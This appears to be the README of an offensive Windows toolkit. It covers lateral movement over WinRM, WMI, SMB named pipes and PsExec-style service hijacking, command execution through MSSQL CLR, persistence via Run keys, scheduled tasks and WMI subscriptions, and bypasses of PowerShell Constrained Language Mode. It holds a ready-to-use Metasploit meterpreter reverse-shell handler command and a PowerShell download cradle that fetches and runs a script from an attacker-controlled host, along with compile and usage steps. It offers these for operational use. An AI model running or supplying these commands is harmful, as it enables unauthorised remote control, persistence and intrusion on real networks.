# Lateral Movement, Persistence & CLM Bypass

| File | Purpose |
|---|---|
| `winrm-psremoting.ps1` | WinRM/PSRemoting lateral movement — run a PowerShell stager on a remote host |
| `wmi-exec.ps1` | WMI lateral movement — spawn a remote process via `Win32_Process` |
| `invoke-smbremoting.ps1` | SMB named-pipe **fileless** lateral movement (interactive shell / command) |
| `psexec-lat.cs` | Service-hijack lateral movement (PsExec-style, reuses a target service) |
| `mssql-clr/` | MSSQL CLR assembly (`cmd_exec`) — RCE via `CREATE ASSEMBLY` |
| `persistence.ps1` | Persistence — registry Run key, scheduled task, WMI event subscription |
| `clm-bypass.md` | Constrained Language Mode (CLM) bypass techniques |

The PowerShell payloads (`winrm-psremoting.ps1`, `wmi-exec.ps1`, `persistence.ps1`)
are stager download cradles by default — edit the URL or swap in your implant.
`invoke-smbremoting.ps1` and `psexec-lat.cs` need admin creds on the target
(no WinRM/WMI required for SMB named-pipes). `mssql-clr/` needs `sa` + CLR enabled.

```bash
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j"
```

## Extra tools (no WinRM/WMI needed)

| Tool | Requires | Usage |
|---|---|---|
| `invoke-smbremoting.ps1` | admin over SMB (named pipes) | `iex(iwr http://<IP>/invoke-smbremoting.ps1 -useb)` → `Invoke-SMBRemoting -ComputerName <TARGET>` (shell) or `-Command "whoami /all"` |
| `psexec-lat.cs` | admin creds + service control | `csc /target:exe /out:PsExecLat.exe psexec-lat.cs` → `PsExecLat.exe <TARGET> <payload.exe>` (reuses the target's `SensorService`) |
| `mssql-clr/` | `sa` on MSSQL + CLR enabled | `csc /target:library mssql-clr/cmd_exec.cs` → hex via `mssql-clr/convert-tohex.ps1` → `CREATE ASSEMBLY` … `cmd_exec 'whoami'` |
